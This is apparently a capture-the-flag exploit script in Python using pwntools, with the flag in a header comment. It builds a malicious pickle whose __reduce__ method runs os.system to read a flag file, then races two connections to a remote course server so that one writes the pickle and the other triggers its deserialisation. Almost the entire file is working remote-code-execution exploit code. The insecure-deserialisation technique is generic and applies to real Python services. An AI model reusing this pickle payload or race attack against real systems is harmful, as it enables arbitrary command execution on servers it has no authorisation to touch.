# SSof{Pickles_RCE_Th1s_was_an_easy_race}
from pwn import *

import pickletools
import pickle
import threading

class Note(object):
    def __init__(self, name, content):
        self.name = name
        self.content = content

    def __str__(self):
        return "Note '%s': %s" % (self.name, self.content)
        
class PickleBomb:
    def __reduce__(self):
        cmd = ('cat home/ctf/flag')
        return os.system, (cmd,)
      
pickled = pickle.dumps(PickleBomb())


'''
Idea:
Write in free mode pickle bomb.
Read in classy mode for pickle.load file content.
Race condition because when switching modes they clean files
'''

def writePickleBomb(session, bomb):
    # session.recvall()()
    session.sendline(b"1")
    session.sendline(b"1")
    session.sendline(b"exploit")
    session.send(bomb)
    session.send(b"\n\n")
    res = session.recvall(timeout=1)
    print(res.decode("utf8"))

def readFile(session):
    # print(session.recvall()())
    session.sendline(b"0")
    session.sendline(b"0")
    session.sendline(b"exploit")
    # session.interactive()
    res = session.recvall(timeout=1)
    print(res)
    # if b"bash" in res:


while True:
    w = remote('mustard.stt.rnl.tecnico.ulisboa.pt', 22653, timeout=9999)
    r = remote('mustard.stt.rnl.tecnico.ulisboa.pt', 22653, timeout=9999)


    w.sendline(b"du")
    r.sendline(b"du")

    w.recvuntil(b'want:')
    r.recvuntil(b'want:')

    #Thread write
    tw = threading.Thread(target=writePickleBomb, args=(w, pickled, ))
    rw = threading.Thread(target=readFile, args=(r, ))
    tw.start()
    rw.start()

    tw.join()
    rw.join()

    break
